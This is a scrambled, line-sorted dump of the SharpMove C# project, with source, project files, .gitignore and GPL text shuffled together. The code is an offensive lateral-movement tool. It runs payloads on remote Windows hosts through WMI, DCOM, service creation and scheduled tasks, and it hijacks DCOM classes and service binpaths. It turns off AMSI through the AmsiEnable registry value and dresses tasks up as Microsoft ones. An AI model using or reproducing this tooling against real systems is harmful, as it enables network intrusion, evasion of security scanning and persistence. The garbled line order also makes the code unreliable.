"                myEventConsumer[""ScriptingEngine""] = ""VBScript"""
"                myEventFilter[""EventNameSpace""] = @"""
"                myEventFilter[""Name""] = eventName"
"                myEventFilter[""Query""] = myEventQuery.QueryString"
"                myEventFilter[""QueryLanguage""] = myEventQuery.QueryLanguage"
"                myTimer[""IntervalBetweenEvents""] = (UInt32)5000"
"                myTimer[""SkipIfPassed""] = false"
"                myTimer[""TimerId""] = ""Timer"""
"                string origpath = wmiservice[""PathName""].ToString()"
"                string origstate = wmiservice[""State""].ToString()"
"                string srvpath = string.Format(""Win32_Service.Name='{0}'"", servicename)"
"                throw new Exception(""[X] Failed to obtain a handle to the service control manager database - MAKE SURE YOU ARE ADMIN"")"
"                throw new Exception($""[X] Failed to obtain a handle to service '{serviceName}'."")"
"                var lengthLeft = Math.Min(partLength, text.Length - index)"
"                var line = text.Substring(index, lengthLeft)"
"                var wmiProcess = new ManagementClass(scope, new ManagementPath(""Win32_Process""), new ObjectGetOptions())"
"                var x = Int32.Parse(outParams[""returnValue""].ToString())"
"                wmiNameSpace = ""root"
"                wmiservice.InvokeMethod(""Change"", inParams, null)"
"            //Untested, use at own risk"
"            Automatic = 2,"
"            BootStart = 0,"
"            Console.WriteLine(""    SharpMove.exe action=create computername=remote.host.local command="
"            Console.WriteLine(""    SharpMove.exe action=dcom computername=remote.host.local command="
"            Console.WriteLine(""    SharpMove.exe action=executevbs computername=remote.host.local throw=wmi location=local droplocation=C:"
"            Console.WriteLine(""    SharpMove.exe action=query computername=remote.host.local query="
"            Console.WriteLine(""    SharpMove.exe action=scm computername=remote.host.local command="
"            Console.WriteLine(""    SharpMove.exe action=taskscheduler computername=remote.host.local command="
"            Console.WriteLine("""
"            Console.WriteLine("""")"
"            Console.WriteLine(""["
"            IRegisteredTask regTask = folder.RegisterTaskDefinition(taskname, task, (int)_TASK_CREATION.TASK_CREATE_OR_UPDATE, runas, null, _TASK_LOGON_TYPE.TASK_LOGON_INTERACTIVE_TOKEN, """")"
"            ITaskFolder containingFolder = objScheduler.GetFolder("""
"            ITaskFolder folder = scheduler.GetFolder("""
"            IntPtr hService,"
"            IntPtr lpdwTagId,"
"            IntPtr scmHandle = OpenSCManager(host, null, SC_MANAGER_CREATE_SERVICE)"
"            IntPtr serviceControlManagerHandle,"
"            IntPtr serviceHandle = CreateService(scmHandle, serviceName, serviceName, SERVICE_ACCESS.SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, binpath, null, IntPtr.Zero, null, null, null)"
"            IntPtr serviceHandle = OpenService(scmHandle, serviceName, SERVICE_ACCESS.SERVICE_ALL_ACCESS)"
"            ManagementScope scope = new ManagementScope(String.Format("""
"            Manual = 3,"
"            SERVICE_ACCESS dwDesiredAccess,"
"            SERVICE_CHANGE_CONFIG = 0x00002,"
"            SERVICE_ENUMERATE_DEPENDENTS = 0x00008,"
"            SERVICE_INTERROGATE = 0x00080,"
"            SERVICE_PAUSE_CONTINUE = 0x00040,"
"            SERVICE_QUERY_CONFIG = 0x00001,"
"            SERVICE_QUERY_STATUS = 0x00004,"
"            SERVICE_START = 0x00010,"
"            SERVICE_STOP = 0x00020,"
"            SERVICE_USER_DEFINED_CONTROL = 0x00100,"
"            STANDARD_RIGHTS_REQUIRED = 0xF0000,"
"            StartService(serviceHandle, 0, null)"
"            SystemStart = 1,"
"            [In] char[] lpDependencies,"
"            action.Id = ""Exec Action"""
"            containingFolder.DeleteTask(taskname, 0)"
"            else if (arguments[""action""].ToLower() == ""create"")"
"            else if (arguments[""action""].ToLower() == ""dcom"")"
"            else if (arguments[""action""].ToLower() == ""executevbs"")"
"            else if (arguments[""action""].ToLower() == ""scm"")"
"            else if (arguments[""action""].ToLower() == ""startservice"")"
"            else if (arguments[""action""].ToLower() == ""stopservice"")"
"            else if (arguments[""action""].ToLower() == ""taskscheduler"")"
"            else if (command.Contains("":"") "
"            else if(arguments[""action""].ToLower() == ""hijackdcom"")"
"            else if(arguments[""action""].ToLower() == ""modschtask"")"
"            else if(arguments[""action""].ToLower() == ""modsvc"")"
"            if (!arguments.ContainsKey(""action""))"
"            if (actionid != """" "
"            if (arguments.ContainsKey(""password"") "
"            if (arguments.ContainsKey(""username""))"
"            if (arguments[""action""].ToLower() == ""query"")"
"            if (partLength < 1) { throw new ArgumentException(""'columns' must be greater than 0."")"
"            if (text == null) { throw new ArgumentNullException(""singleLineString"")"
"            if (username != """" "
"            if (wmiNameSpace == """")"
"            string Command = String.Format(""{0}"
"            string lpBinaryPathName,"
"            string lpDependencies,"
"            string lpDisplayName,"
"            string lpLoadOrderGroup,"
"            string lpPassword,"
"            string lpPathName,"
"            string lpServiceStartName,"
"            string lpSvcName,"
"            string password = """""
"            string runas = ""SYSTEM"""
"            string username = """""
"            string wmiNameSpace = ""root"
"            task.RegistrationInfo.Author = ""Microsoft Corporation"""
"            task.RegistrationInfo.Description = ""Microsoft Services Standby Task"""
"            uint dwErrorControl,"
"            uint dwServiceType,"
"            uint dwStartType,"
"            uint nErrorControl,"
"            uint nServiceType,"
"            uint nStartType,"
"            var arguments = new Dictionary<string, string>()"
"        //Yes I'm aware this shouldn't be here, I'll fix it some other time"
"        [DllImport(""Advapi32.dll"")]"
"        [DllImport(""advapi32.dll"")]"
"        [DllImport(""advapi32.dll"", CharSet = CharSet.Auto, SetLastError = true)]"
"        [DllImport(""advapi32.dll"", CharSet = CharSet.Unicode, SetLastError = true)]"
"        [DllImport(""advapi32.dll"", EntryPoint = ""CloseServiceHandle"")]"
"        private static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess)"
"        private static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, SERVICE_ACCESS dwDesiredAccess)"
"        private static extern int StartService(IntPtr serviceHandle, int dwNumServiceArgs, string lpServiceArgVectors)"
"        public static System.Collections.Generic.IEnumerable<string> Split(string text, int partLength)"
"        public static extern Boolean QueryServiceConfig(IntPtr hService, IntPtr intPtrQueryConfig, UInt32 cbBufSize, out UInt32 pcbBytesNeeded)"
"        public static string vbsdata = @"""""
"        static ManagementScope WMIConnect(string host, string username, string password)"
"        static void CreateSchTask(string host, string username, string password, string command, string taskname)"
"        static void CreateService(string host, string serviceName, string binpath)"
"        static void DCOMHijack(string host, string clsid)"
"        static void DeleteSchTask(string host, string username, string password, string taskname)"
"        static void DeleteService(string host, string serviceName)"
"        static void LocalWMIQuery(string wmiQuery, string wmiNameSpace = """")"
"        static void ModSchTask(string host, string username, string password, string command, string taskname, string sfolder)"
"        static void ModServiceWMI(ManagementScope scope, string servicename, string command)"
"        static void RemoteDCOM(string host, string command, string Method)"
"        static void RemoteWMIExecute(ManagementScope scope, string command)"
"        static void RemoteWMIExecuteVBS(string host, string eventName, string username, string password)"
"        static void RemoteWMIQuery(string host, string wmiQuery, string wmiNameSpace, string username, string password)"
"        static void StartService(string host, string servicename)"
"        static void StopService(string host, string servicename)"
"        static void UnsetRegKey(ManagementScope scope, List<ManagementBaseObject> outParams)"
"    ""keep intact all notices""."
"    (including a physical distribution medium), accompanied by a"
"    (including a physical distribution medium), accompanied by the"
"    <COMReference Include=""TaskScheduler"">"
"    <Compile Include=""Program.cs"" />"
"    <Compile Include=""Properties"
"    <Configuration Condition="" '$(Configuration)' == '' "">Debug</Configuration>"
"    <Platform Condition="" '$(Platform)' == '' "">AnyCPU</Platform>"
"    <Reference Include=""Microsoft.CSharp"" />"
"    <Reference Include=""System"" />"
"    <Reference Include=""System.Core"" />"
"    <Reference Include=""System.Management"" />"
"    <Reference Include=""System.ServiceProcess"" />"
"    Corresponding Source, you remain obligated to ensure that it is"
"    License will therefore apply, along with any applicable section 7"
"    This is free software, and you are welcome to redistribute it"
"    This program is distributed in the hope that it will be useful,"
"    a) Convey the object code in, or embodied in, a physical product"
"    additional terms, to the whole of the work, and all its parts,"
"    along with this program.  If not, see <https://www.gnu.org/licenses/>."
"    alternative is allowed only occasionally and noncommercially, and"
"    b) Convey the object code in, or embodied in, a physical product"
"    c) Prohibiting misrepresentation of the origin of that material, or"
"    c) You must license the entire work, as a whole, under this"
"    conveying of source, or (2) access to copy the"
"    copy the object code is a network server, the Corresponding Source"
"    d) If the work has interactive user interfaces, each must display"
"    e) Convey the object code using peer-to-peer transmission, provided"
"    interfaces that do not display Appropriate Legal Notices, your"
"    it) with contractual assumptions of liability to the recipient, for"
"    it, and giving a relevant date."
"    medium customarily used for software interchange, for a price no"
"    model, to give anyone who possesses the object code either (1) a"
"    only if you received the object code with such an offer, in accord"
"    permission to license the work in any other way, but it does not"
"    place (gratis or for a charge), and offer equivalent access to the"
"    product that is covered by this License, on a durable physical"
"    that supports equivalent copying facilities, provided you maintain"
"    the Free Software Foundation, either version 3 of the License, or"
"    trade names, trademarks, or service marks"
"    written offer, valid for at least three years and valid for as"
"  ""Additional permissions"" are terms that supplement the terms of this"
"  ""Copyright"" also means copyright-like laws that apply to other kinds of"
"  ""Installation Information"" for a User Product means any methods,"
"  ""The Program"" refers to any copyrightable work licensed under this"
"  ""This License"" refers to version 3 of the GNU General Public License."
"  2019"")]"
"  <Import Project=""$(MSBuildExtensionsPath)"
"  <Import Project=""$(MSBuildToolsPath)"
"  <PropertyGroup Condition="" '$(Configuration)"
"  A ""Standard Interface"" means an interface that either is an official"
"  A ""User Product"" is either (1) a ""consumer product"", which means any"
"  A ""contributor"" is a copyright holder who authorizes use under this"
"  A ""covered work"" means either the unmodified Program or a work based"
"  A contributor's ""essential patent claims"" are all patent claims"
"  A patent license is ""discriminatory"" if it does not include within"
"  A separable portion of the object code, whose source code is excluded"
"  Additional terms, permissive or non-permissive, may be stated in the"
"  All other non-permissive additional terms are considered ""further"
"  An ""entity transaction"" is a transaction transferring control of an"
"  An interactive user interface displays ""Appropriate Legal Notices"""
"  Corresponding Source conveyed, and Installation Information provided,"
"  Each contributor grants you a non-exclusive, worldwide, royalty-free"
"  Each time you convey a covered work, the recipient automatically"
"  Finally, every program is threatened constantly by software patents."
"  For example, if you distribute copies of such a program, whether"
"  For the developers' and authors' protection, the GPL clearly explains"
"  However, if you cease all violation of this License, then your"
"  If conditions are imposed on you (whether by court order, agreement or"
"  If the program does terminal interaction, make it output a short"
"  If you add terms to a covered work in accord with this section, you"
"  If you convey a covered work, knowingly relying on a patent license,"
"  If you convey an object code work under this section in, or with, or"
"  If you develop a new program, and you want it to be of the greatest"
"  If, pursuant to or in connection with a single transaction or"
"  In the following three paragraphs, a ""patent license"" is any express"
"  Moreover, your license from a particular copyright holder is"
"  Notwithstanding any other provision of this License, for material you"
"  Notwithstanding any other provision of this License, you have"
"  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY"
"  The ""Corresponding Source"" for a work in object code form means all"
"  The ""System Libraries"" of an executable work include anything, other"
"  The ""source code"" for a work means the preferred form of the work"
"  The GNU General Public License is a free, copyleft license for"
"  The precise terms and conditions for copying, distribution and"
"  To ""convey"" a work means any kind of propagation that enables other"
"  To ""modify"" a work means to copy from or adapt all or part of the work"
"  To ""propagate"" a work means to do anything with it that, without"
"  To do so, attach the following notices to the program.  It is safest"
"  To protect your rights, we need to prevent others from denying you"
"  When we speak of free software, we are referring to freedom, not"
"  When you convey a copy of a covered work, you may at your option"
"  When you convey a covered work, you waive any legal power to forbid"
"  You may charge any price or no price for each copy that you convey,"
"  You may convey a work based on the Program, or the modifications to"
"  You may make, run and propagate covered works that you do not"
"  You should also get your employer (if you work as a programmer) or school,"
" !arguments.ContainsKey(""username""))"
" (arguments.ContainsKey(""command"")))"
" Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>"
" FROM __TimerEvent WHERE TimerID = 'Timer'"")"
" Ignore Visual Studio temporary files, build results, and"
" Note: Comment the next line if you want to checkin your web deploy settings,"
" Since there are multiple workflows, uncomment next line to ignore bower_components"
" arguments.ContainsKey(""clsid""))"
" arguments.ContainsKey(""command"") "
" arguments.ContainsKey(""servicename""))"
" arguments.ContainsKey(""taskname""))"
" arguments[""amsi""] == ""true"")"
" casplit[0], """")"
" checkin your Azure Web App publish settings, but sensitive information contained"
" command.Contains("""
" except build/, which is used as an MSBuild target."
" for a GUI interface, you would use an ""about box""."
" from win32_process"" username=domain"
" however, if the Program has interactive"
" of this license document, but changing it is not allowed."
" password != """")"
" to a newer Visual Studio version. Backup files are not needed,"
""" method=ShellBrowserWindow amsi=true"
""" throw=wmi location=local droplocation=C:"
""" username=domain"
""", """")"
"""Major Component"", in this context, means a major essential component"
"""aggregate"" if the compilation and its resulting copyright are not"
"""recipients"" may be individuals or organizations."
"""select "
"(1) assert copyright on the software, and (2) offer you this License"
"(if any) on which the executable work runs, or a compiler used to"
"(kernel, window system, and so on) of the specific operating system"
"// COM, set the ComVisible attribute to true on that type."
"// [assembly: AssemblyVersion(""1.0."
"11 of the WIPO copyright treaty adopted on 20 December 1996, or"
"<Project ToolsVersion=""15.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
"ALL NECESSARY SERVICING, REPAIR OR CORRECTION."
"AnyCPU' "">"
"AssemblyInfo.cs"" />"
"CIMv2"""
"Component, and (b) serves only to enable use of the work with that"
"Corresponding Source of the work from the predecessor in interest, if"
"For more information on this, and how to apply and follow the GNU GPL, see"
"GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE"
"GNU General Public License, you may choose any version ever published"
"HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM ""AS IS"" WITHOUT WARRANTY"
"IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF"
"License and any other pertinent obligations, then as a consequence you may"
"License will continue to apply to the part which is the covered work,"
"License, you may add to a covered work material governed by the terms"
"License.  Each licensee is addressed as ""you"".  ""Licensees"" and"
"Major Component, or to implement a Standard Interface for which an"
"Microsoft Visual Studio Solution File, Format Version 12.00"
"Microsoft.CSharp.targets"" />"
"Microsoft.Common.props"" Condition=""Exists('$(MSBuildExtensionsPath)"
"Microsoft.Common.props')"" />"
"OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,"
"PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),"
"Program, unless a warranty or assumption of liability accompanies a"
"Project(""{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}"") = ""SharpMove"", ""SharpMove"
"Public License ""or any later version"" applies to it, you have the"
"Public License instead of this License.  But first, please read"
"Settings"""
"SharpMove.csproj"", ""{8BF82BBE-909C-4777-A2FC-EA7C070FF43E}"""
"SharpMove.exe action=create computername=remote.host.local command=""C:"
"SharpMove.exe action=dcom computername=remote.host.local command=""C:"
"SharpMove.exe action=modschtask computername=remote.host.local command=""C:"
"SharpMove.exe action=modsvc computername=remote.host.local command=""C:"
"SharpMove.exe action=query computername=remote.host.local query=""select "
"SharpMove.exe action=scm computername=remote.host.local command=""C:"
"SharpMove.exe action=taskscheduler computername=remote.host.local command=""C:"
"System Libraries, or general-purpose tools or generally available free"
"THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY"
"Temp filename=file.exe eventname=Debug method=ShellBrowserWindow amsi=true"")"
"Temp filename=file.exe eventname=Debug servicename=WindowsDebug amsi=true"")"
"Temp"""
"WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS"
"Windows Script"""
"[assembly: AssemblyCompany("""")]"
"[assembly: AssemblyConfiguration("""")]"
"[assembly: AssemblyCopyright(""Copyright "
"[assembly: AssemblyCulture("""")]"
"[assembly: AssemblyDescription("""")]"
"[assembly: AssemblyFileVersion(""1.0.0.0"")]"
"[assembly: AssemblyProduct(""SharpMove"")]"
"[assembly: AssemblyTitle(""SharpMove"")]"
"[assembly: AssemblyTrademark("""")]"
"[assembly: AssemblyVersion(""1.0.0.0"")]"
"[assembly: Guid(""8bf82bbe-909c-4777-a2fc-ea7c070ff43e"")]"
"]  Original Service Information"")"
"]  Resetting Service binpath      :  {0}"", origpath)"
"]  Service running, stopping      :  {0}"
"]  Starting Service               :  {0}"", servicename)"
"]  Startup of service returned    :  {0}"", outParams[""returnValue""])"
"]  Stopping service"")"
"]  Updating Service binpath       :  {0}"", command)"
"]  User credentials               : {0}"", username)"
"]  WMI connection established"")"
"] Action and args      :  {0} {1}"", origcmd, origargs)"
"] AmsiEnable left at original value: {0}"", originalvalue)"
"] AmsiEnable set back to : {0}"", originalvalue)"
"] AmsiEnable set to : 0"")"
"] AmsiEnable value removed"")"
"] Bin path      :    {0}"", wmiservice[""PathName""])"
"] Created AmsiEnable and set to : 0"")"
"] Created Windows Script"")"
"] Creating Event Subscription {0}   : {1}"", eventName, host)"
"] Creating task '{0}' on   : {1}"", taskname, host)"
"] Creating {0} service on   : {1}"", serviceName, host)"
"] Creation of process returned   : {0}"", outParams[""returnValue""])"
"] DCOM Hijack for CLSID   :  {0}   {1}"", clsid, host)"
"] Deleting task {0} on    : {1}"", taskname, host)"
"] Display name  :    {0}"", wmiservice[""DisplayName""])"
"] Executing '{0}' task...  : {1}"", taskname, host)"
"] Executing DCOM ExcelDDE   : {0}"", host)"
"] Executing DCOM MMC     : {0}"", host)"
"] Executing DCOM ShellBrowserWindow   : {0}"", host)"
"] Executing DCOM ShellWindows   : {0}"", host)"
"] Modifying task action      :  {0}"", command)"
"] Original AmsiEnable value : {0}"", origval)"
"] Original Task Information"")"
"] Removed AmsiEnable Value"")"
"] Service       :    {0}"", wmiservice[""Name""])"
"] Service started       :  {0} - {1}  "", targetservice.ServiceName, host)"
"] Service stopped        :  {0} - {1}  "", targetservice.ServiceName, host)"
"] Service {0} has been deleted on   : {1}"", serviceName, host)"
"] Setting {0} back to original state"", taskname)"
"] Settings key removed"")"
"] Starting {0} service on   : {1}"", serviceName, host)"
"] Taskname and ID      :  {0} - {1}"", taskname, acts.Id)"
"] User credentials   : {0}"", username)"
"] Value doesnt exist...creating"")"
"] Windows Script Key existed...leaving alone"")"
"] Windows Script key removed"")"
"] {0} has been enabled and started on   : {1}"", serviceName, host)"
"a computer network, with no transfer of a copy, is not conveying."
"above cannot be given local legal effect according to their terms,"
"actual knowledge that, but for the patent license, your conveying the"
"actually uses, or expects or is expected to use, the product.  A product"
"add to a covered work, you may (if authorized by the copyright holders of"
"additional permissions on material, added by you to a covered work,"
"additional terms that apply to those files, or a notice indicating"
"agreement or commitment, however denominated, not to enforce a patent"
"and control, on terms that prohibit them from making any copies of"
"and which are not combined with it such as to form a larger program,"
"any patent claim is infringed by making, using, selling, offering for"
"apply only to part of the Program, that part may be used separately"
"arrangement, you convey, or propagate by procuring conveyance of, a"
"authors' sake, the GPL requires that modified versions be marked as"
"available, or (2) arrange to deprive yourself of the benefit of the"
"be similar in spirit to the present version, but may differ in detail to"
"be treated as though they were included in this License, to the extent"
"but the special requirements of the GNU Affero General Public License,"
"by this License, of making, using, or selling its contributor version,"
"certain responsibilities if you distribute copies of the software, or if"
"changed, so that their problems will not be attributed erroneously to"
"cimv2"""
"cimv2"", host), options)"
"cmdpath = cmdpath.Replace("""
"combined work, and to convey the resulting work.  The terms of this"
"commercial, industrial or non-consumer uses, unless such uses represent"
"computer or modifying a private copy.  Propagation includes copying,"
"consistent with the requirements of this License, to extend the patent"
"contain the covered work, unless you entered into that arrangement,"
"content, constitutes a covered work.  This License acknowledges your"
"control those activities.  However, it does not include the work's"
"convey, without conditions so long as your license otherwise remains"
"conveyed by you (or copies made from those copies), or (b) primarily"
"copyright holder, and you cure the violation prior to 30 days after"
"copyright on the Program, and are irrevocable provided the stated"
"covered work in a country, or your recipient's use of the covered work"
"covered work is covered by this License only if the output, given its"
"covered work, and grant a patent license to some of the parties"
"covered work, you indicate your acceptance of this License to do so."
"distribution (with or without modification), making available to the"
"earlier work or a work ""based on"" the earlier work."
"exact copy.  The resulting work is called a ""modified version"" of the"
"extent that warranties are provided), that licensees may convey the"
"feature that (1) displays an appropriate copyright notice, and (2)"
"finally terminates your license, and (b) permanently, if the copyright"
"fixed term (regardless of how the transaction is characterized), the"
"for a work that has been modified or installed by the recipient, or for"
"for making modifications to it.  ""Object code"" means any non-source"
"for you must do so exclusively on your behalf, under your direction"
"form of a separately written license, or stated as exceptions"
"free programs, and that you know you can do these things."
"freedoms that you received.  You must make sure that they, too, receive"
"from the Corresponding Source as a System Library, need not be"
"give under the previous paragraph, plus a right to possession of the"
"giving you legal permission to copy, distribute and/or modify it."
"gratis or for a fee, you must pass on to the recipients the same"
"hereafter acquired, that would be infringed by some manner, permitted"
"if any, to sign a ""copyright disclaimer"" for the program, if necessary."
"in a country, would infringe one or more identifiable patents in that"
"in a fashion requiring copyright permission, other than the making of an"
"in or on a volume of a storage or distribution medium, is called an"
"in the business of distributing software, under which you make payment"
"infringement under applicable copyright law, except executing it on a"
"interfaces specified for a particular programming language, one that"
"into a dwelling.  In determining whether a product is a consumer product,"
"into proprietary programs.  If your program is a subroutine library, you"
"license to downstream recipients.  ""Knowingly relying"" means you have"
"linked subprograms that the work is specifically designed to require,"
"machine-readable Corresponding Source under the terms of this License,"
"make it effectively proprietary.  To prevent this, the GPL assures that"
"make, use, sell, offer for sale, import and otherwise run, modify and"
"menu, a prominent item in the list meets this criterion."
"modification of the work as a means of enforcing, against the work's"
"modified object code on the User Product (for example, the work has"
"modified versions of the software inside them, although the manufacturer"
"modify it is void, and will automatically terminate your rights under"
"must place, in the relevant source files, a statement of the"
"n  Host                           : {0}"", host)"
"n  SharpMove.exe"")"
"n"", eventName)"
"n"", outParams[""processId""])"
"n"", servicename)"
"not accept this License.  Therefore, by modifying or propagating a"
"not convey it at all.  For example, if you agree to terms that obligate you"
"not impose a license fee, royalty, or other charge for exercise of"
"of having them make modifications exclusively for you, or provide you"
"of sections 4 and 5, provided that you also convey the"
"of that license document, provided that the further restriction does"
"of the GPL, as needed to protect the freedom of users."
"or convey a specific copy of the covered work, then the patent license"
"or household purposes, or (2) anything designed or sold for incorporation"
"or that patent license was granted, prior to 28 March 2007."
"organization, or merging organizations.  If propagation of a covered"
"organization, or substantially all assets of one, or subdividing an"
"otherwise) that contradict the conditions of this License, they do not"
"owned or controlled by the contributor, whether already acquired or"
"packaging a Major Component, but which is not part of that Major"
"parties who would receive the covered work from you, a discriminatory"
"parts of the General Public License.  Of course, your program's commands"
"patent license for this particular work, or (3) arrange, in a manner"
"patent license under the contributor's essential patent claims, to"
"payload.exe"" amsi=true servicename=TestService"
"payload.exe"" amsi=true username=domain"
"payload.exe"" servicename=WindowsDebug amsi=true"
"payload.exe"" taskname=Debug amsi=true username=domain"
"payload.exe"" username=domain"
"permission, would make you directly or secondarily liable for"
"permissions.  However, no additional obligations are imposed on any"
"possible use to the public, the best way to achieve this is to make it"
"procedures, authorization keys, or other information required to install"
"produce it from the Program, in the form of source code under the"
"produce the work, or an object code interpreter used to run it."
"product received by a particular user, ""normally used"" refers to a"
"products.  If such problems arise substantially in other domains, we"
"propagate that work, subject to this License.  You are not responsible"
"provisionally, unless and until the copyright holder explicitly and"
"public, and in some countries other activities as well."
"publicly available network server or other readily accessible means,"
"purposes of this definition, ""control"" includes the right to grant"
"receive it, in any medium, provided that you conspicuously and"
"received it, or any part of it, contains a notice stating that it is"
"receives a license from the original licensors, to run, modify and"
"receiving the covered work authorizing them to use, propagate, modify"
"reinstated, you do not qualify to receive new licenses for the same"
"remove any additional permissions from that copy, or from any part of"
"requirement to continue to provide support service, warranty, or updates"
"restriction, you may remove that term.  If a license document contains"
"restrictions"" within the meaning of section 10.  If the Program as you"
"rights granted or affirmed under this License.  For example, you may"
"rights granted under this License, and you may not initiate litigation"
"rights of fair use or other equivalent, as provided by copyright law."
"sale, or importing the Program or any portion of it."
"section 13, concerning interaction through a network will apply to the"
"software for all its users.  We, the Free Software Foundation, use the"
"software on general-purpose computers, but in those that do, we wish to"
"source code form), and must require no special password or key for"
"specifically for use in, a User Product, and the conveying occurs as"
"standard defined by a recognized standards body, or, in the case of"
"subscription"", host), options)"
"sue for patent infringement).  To ""grant"" such a patent license to a"
"system32"""
"tangible personal property which is normally used for personal, family,"
"terms of section 4, provided that you also meet all of these conditions:"
"than the work as a whole, that (a) is included in the normal form of"
"the ""copyright"" line and a pointer to where the full notice is found."
"the Program, the only way you could satisfy both those terms and this"
"the covered work, and you disclaim any intention to limit operation or"
"the interface presents a list of user commands or options, such as a"
"the library.  If this is what you want to do, use the GNU Lesser General"
"the scope of its coverage, prohibits the exercise of, or is"
"the source code needed to generate, install, and (for an executable"
"the work, and the source code for shared libraries and dynamically"
"the work, and under which the third party grants, to any of the"
"them if you wish), that you receive source code or can get it if you"
"these rights or asking you to surrender the rights.  Therefore, you have"
"to copy, free of charge and under the terms of this License, through a"
"to receive a copy likewise does not require acceptance.  However,"
"to take away your freedom to share and change the works.  By contrast,"
"typical or common use of that class of product, regardless of the status"
"under those permissions, but the entire Program remains governed by"
"unpacking, reading or copying."
"use, which is precisely where it is most unacceptable.  Therefore, we"
"user password=password"")"
"users, your or third parties' legal rights to forbid circumvention of"
"versions of the GNU General Public License can be used, that proxy's"
"violation by some reasonable means, this is the first time you have"
"want it, that you can change the software or use pieces of it in new"
"which are not part of the work.  For example, Corresponding Source"
"with facilities for running those works, provided that you comply with"
"work results from an entity transaction, each party to that"
"work thus licensed is called the contributor's ""contributor version""."
"work under this License, and how to view a copy of this License.  If"
"work) run the object code and to modify the work, including scripts to"
"works, such as semiconductor masks."
"works, which are not by their nature extensions of the covered work,"
"xml version=""1.0"" encoding=""utf-8"""
"your programs, too."
"{1}"", Directory, Binary)"
"{1}"", host, wmiNameSpace)"
"{1}"", host, wmiNameSpace), options)"
$(MSBuildToolsVersion)
$(Platform)' == 'Debug
$(Platform)' == 'Release
$tf/
' as shown below:
')[0]
')[1]
(including a cross-claim or counterclaim in a lawsuit) alleging that
(such as an express permission to practice a patent or covenant not to
- [Bb]ackup ([0-9]).rdl
- [Bb]ackup ([0-9][0-9]).rdl
- [Bb]ackup.rdl
.DesktopClient/GeneratedArtifacts
.DesktopClient/ModelManifest.xml
.DotSettings.user
.GhostDoc.xml
.HTMLClient/GeneratedArtifacts
.HxC
.HxT
.Server/GeneratedArtifacts
.Server/ModelManifest.xml
.VC.VC.opendb
.VC.db
.VisualState.xml
.XML
.[Cc]ache
.[Cc]ache/
.[Pp]ublish.xml
.[Rr]e[Ss]harper
.appx
.appxbundle
.appxupload
.aps
.axoCover/
.azurePubxml
.bim.layout
.bim_
.binlog
.btm.cs
.btp.cs
.build.csdef
.builds
.cachefile
.coverage
.coveragexml
.cr/personal
.dbmdl
.dbproj.schemaview
.dotCover
.e2e
.fake/
.gpState
.hhc
.hhk
.hhp
.htm
.ilk
.iobj
.ionide/
.ipdb
.jfm
.jmconfig
.ldf
.local.xml
.localhistory/
.log
.mdf
.meta
.mfractor/
.mm.
.ncb
.ndf
.ntvs_analysis.dat
.nuget.props
.nuget.targets
.nupkg
.nvuser
.obj
.odx.cs
.opendb
.opensdf
.opt
.paket/paket.exe
.pch
.pdb
.pfx
.pgc
.pgd
.pidb
.plg
.psess
.publishproj
.publishsettings
.pubxml
.pyc
.rdl.data
.rptproj.bak
.rptproj.rsuser
.rsp
.rsuser
.sap
.sass-cache/
.sbr
.scc
.sdf
.settings
.sln.docstates
.snk
.snupkg
.suo
.svclog
.tlb
.tlh
.tli
.tmp
.tmp_proj
.tss
.user
.userosscache
.userprefs
.vbw
.vs/
.vsp
.vspscc
.vspx
.vssscc
.xml
.xsd.cs
//      Build Number
//      Major Version
//      Minor Version
//      Revision
// General Information about an assembly is controlled through the following
// Setting ComVisible to false makes the types in this assembly not visible
// The following GUID is for the ID of the typelib if this project is exposed to COM
// Version information for an assembly consists of the following four values:
// You can specify all the values or you can default the Build and Revision Numbers
// associated with an assembly.
// by using the '
// set of attributes. Change these attribute values to modify the information
// to COM components.  If you need to access a type in this assembly from
/[Pp]ackages/
/[Pp]ackages/build/
/[Pp]ackages/repositories.config
</OutputPath>
</Project>
<https://www.gnu.org/licenses/>.
<https://www.gnu.org/licenses/why-not-lgpl.html>.
APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
ASALocalRun/
Additional permissions that are applicable to the entire Program shall
Also add information on how to contact you by electronic and paper mail.
Any CPU
Any CPU = Debug
Any CPU = Release
Any CPU.ActiveCfg = Debug
Any CPU.ActiveCfg = Release
Any CPU.Build.0 = Debug
Any CPU.Build.0 = Release
AppPackages/
AutoTest.Net/
Backup
BenchmarkDotNet.Artifacts/
BundleArtifacts/
ClientBin/
Corresponding Source conveyed under this section must be accompanied
DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD
Debug
DocProject/Help/
DocProject/Help/Html2
DocProject/Help/html
DocProject/buildhelp/
EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
EndGlobal
EndGlobalSection
EndProject
FakesAssemblies/
Foundation.  If the Program does not specify a version number of the
GNU General Public License for most of our software
Generated
Generated_Code/
Global
GlobalSection(ExtensibilityGlobals) = postSolution
GlobalSection(ProjectConfigurationPlatforms) = postSolution
GlobalSection(SolutionConfigurationPlatforms) = preSolution
GlobalSection(SolutionProperties) = preSolution
HideSolutionNode = FALSE
License by making exceptions from one or more of its conditions.
License of the Program or a work on which the Program is based.  The
License would be to refrain entirely from conveying the Program.
Microsoft
MigrationBackup/
MinimumVisualStudioVersion = 10.0.40219.1
OpenCover/
PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
Package.StoreAssociation.xml
